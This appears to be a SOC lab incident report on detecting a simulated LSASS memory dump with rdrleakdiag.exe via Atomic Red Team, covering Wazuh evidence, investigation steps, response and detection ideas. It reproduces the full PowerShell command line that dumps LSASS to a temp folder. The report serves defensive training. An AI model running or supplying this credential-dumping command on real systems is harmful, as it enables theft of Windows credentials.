# Incident 005: Powershell process spawned powershell instance

## Summary
- **Date/time:** 2026-09-14 19:21 (UTC+2)
- **Triggered rule(s):** Powershell process spawned powershell instance (92027)
- **MITRE ATT&CK technique:** T1059.001 - PowerShell, T1003.001 - OS Credential Dumping: LSASS Memory
- **Affected endpoint:** WIN10-LAB
- **Severity:** Critical
- **Verdict:** True positive

## 1. Attack execution
An attack was launched to simulate a dump of the LSASS process using rdrleakdiag.exe
```powershell
Invoke-AtomicTest T1003.001 -TestNumber 13
```

## 2. Evidence collected
- Screenshot of the event in Wazuh
![alt text](../images/005-lsass-dump-lolbin-wazuh.png)
- User/Process: vboxuser → powershell.exe
- Full command line:
```
"powershell.exe" & {if (Test-Path -Path \""$env:SystemRoot\System32\rdrleakdiag.exe\"") {
      $binary_path = \""$env:SystemRoot\System32\rdrleakdiag.exe\""
  } elseif (Test-Path -Path \""$env:SystemRoot\SysWOW64\rdrleakdiag.exe\"") {
      $binary_path = \""$env:SystemRoot\SysWOW64\rdrleakdiag.exe\""
  } else {
      $binary_path = \""File not found\""
      exit 1
  }
$lsass_pid = get-process lsass |select -expand id
if (-not (Test-Path -Path\""$env:TEMP\t1003.001-13-rdrleakdiag\"")) {New-Item -ItemType Directory -Path $env:TEMP\t1003.001-13-rdrleakdiag -Force} 
write-host $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1
& $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1
Write-Host \""Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\t1003.001-13-rdrleakdiag directory.\"
```

## 3. Investigation (step by step)
1. A Sysmon event 1 was observed, which turned out to be the execution of a PowerShell command as administrator `data.win.eventdata.integrityLevel:High` and `data.win.system.eventID:1`
2. The command turned out to be a script for dumping the LSASS.exe process using the rdrleakdiag.exe binary
3. The process chain was powershell.exe -> powershell.exe
4. There were no network connections, Sysmon event 3 was absent `data.win.system.eventID:3`, with no persistence (no 4720/7045) and no 4624 indicating prior remote access, so this is an attack contained to a single host.

## 4. Analysis
By using a binary such as `rdrleakdiag.exe`, the attacker proceeded to dump the LSASS.exe process, representing a serious risk to the security of the system.

## 5. Response actions
- Escalation to L2
- Isolation of the host from the network
- Request for a forensic analysis of the machine

## 6. Improvement recommendations (detection engineering)
I would create a rule to detect PowerShell executions as administrator and classify them as level 15 (maximum) since in most cases they represent a serious risk, and the _Least privilege_ principle comes into play again to reduce the attack surfaces. And I would enable Credential Guard to virtualize LSASS and prevent dumps.

## 7. Lessons learned
I learned how easy it is for an attacker with administrator permissions to dump a process as critical as LSASS.
